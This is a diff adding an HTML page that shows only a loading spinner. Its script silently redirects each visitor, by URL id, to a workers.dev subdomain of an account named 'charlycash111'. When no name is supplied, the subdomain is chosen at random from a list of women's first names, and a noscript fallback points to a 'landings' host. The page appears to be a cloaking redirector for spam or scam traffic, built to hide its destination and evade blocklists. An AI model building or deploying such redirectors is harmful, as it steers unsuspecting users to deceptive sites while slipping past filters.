@@ -1,0 +1,17 @@
+<!doctype html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Loading…</title>
+<style>body{background:#f7f8fa;font-family:system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}.s{width:42px;height:42px;border:3px solid #e5e7eb;border-top-color:#3b82f6;border-radius:50%;animation:r 1s linear infinite}@keyframes r{to{transform:rotate(360deg)}}</style>
+</head><body>
+<div class="s"></div>
+<script>
+  var p = new URLSearchParams(location.search);
+  var id = (p.get('id') || '').replace(/[^a-z0-9]/gi, '').slice(0,8);
+  var names = ['sarah','emily','jessica','ashley','megan','rachel','lauren','hannah','olivia','sophia','isabella','mia','charlotte','amelia','harper','evelyn','abigail'];
+  var w = (p.get('w') || names[Math.floor(Math.random()*names.length)]).replace(/[^a-z0-9-]/gi, '');
+  if (id) location.replace('https://' + w + '.charlycash111.workers.dev/l/' + id);
+</script>
+<noscript><meta http-equiv="refresh" content="0;url=https://landings.charlycash111.workers.dev/"></noscript>
+</body></html>
